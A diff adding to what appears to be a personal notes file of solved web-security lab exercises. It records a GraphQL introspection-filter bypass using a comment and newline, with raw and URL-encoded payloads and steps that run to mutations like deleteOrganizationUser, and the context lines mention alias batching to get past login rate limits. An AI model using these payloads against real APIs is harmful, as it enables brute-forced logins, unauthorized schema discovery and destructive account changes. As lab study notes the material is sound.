@@ -174,3 +174,37 @@ query = "mutation { " + " ".join(aliases) + " }"
 - Rate limiters that count HTTP requests are bypassed
 - Can send 100+ login attempts in a single request
 - The server returns results for all aliases, find the one with a token
+
+## Verified Lab Solution: Hidden Endpoint + Introspection Bypass
+
+**Lab #60** - SOLVED 2026-07-07
+
+### Technique: GraphQL Comment Bypass for Introspection
+
+**Problem**: Server blocks introspection queries containing `__schema{`
+
+**Bypass**: Insert GraphQL comment (#) + newline after `__schema`
+
+```
+# Blocked:
+{"query": "{__schema{types{name}}}"}
+
+# Bypassed:
+{"query": "{__schema#\n{types{name}}}"}
+
+# URL encoded (GET request):
+/api?query={__schema%23__typename%0a{types{name}}}
+```
+
+### Why it works
+- Regex checks for literal `__schema{` in query string
+- GraphQL parser treats `#` as comment (ignores rest of line)
+- Parser sees: `__schema` (newline) `{types{name}}`
+- Regex sees: `__schema` + comment chars + `{` (no match)
+
+### Steps
+1. Find hidden endpoint (try /api, /v1, /query, /graph)
+2. Confirm with: GET /api?query={__typename}
+3. Bypass introspection: __schema#\n{
+4. Discover mutations: deleteOrganizationUser, updateUser, etc.
+5. Use mutation to exploit
